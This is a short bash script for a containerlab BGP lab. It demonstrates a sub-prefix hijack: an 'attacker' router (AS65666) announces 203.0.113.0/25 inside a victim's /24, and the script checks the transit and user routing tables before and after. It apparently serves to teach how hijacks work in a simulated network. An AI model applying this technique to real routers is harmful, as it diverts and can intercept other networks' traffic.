#!/usr/bin/env bash
# Sub-prefix hijack: attacker (AS65666) announces 203.0.113.0/25,
# hijacking a slice of victim's (AS65010) 203.0.113.0/24.
set -eu
P=clab-bgp-lab
r(){ docker exec "$1" vtysh "${@:2}"; }

echo "### BEFORE — transit FIB for 203.0.113.1"
r ${P}-transit -c "show ip route 203.0.113.1" | grep -E "via|entry"

echo "### INJECT — attacker announces 203.0.113.0/25"
r ${P}-attacker -c "conf t" -c "router bgp 65666" \
  -c "address-family ipv4 unicast" -c "network 203.0.113.0/25" -c "end"
sleep 3

echo "### AFTER — hijacked (.1) vs safe (.200)"
r ${P}-transit -c "show ip route 203.0.113.1"   | grep -E "via|entry"
r ${P}-transit -c "show ip route 203.0.113.200" | grep -E "via|entry"
echo "### user BGP: winning path for 203.0.113.1"
r ${P}-user -c "show ip bgp 203.0.113.1" | grep -E "6500|6566"
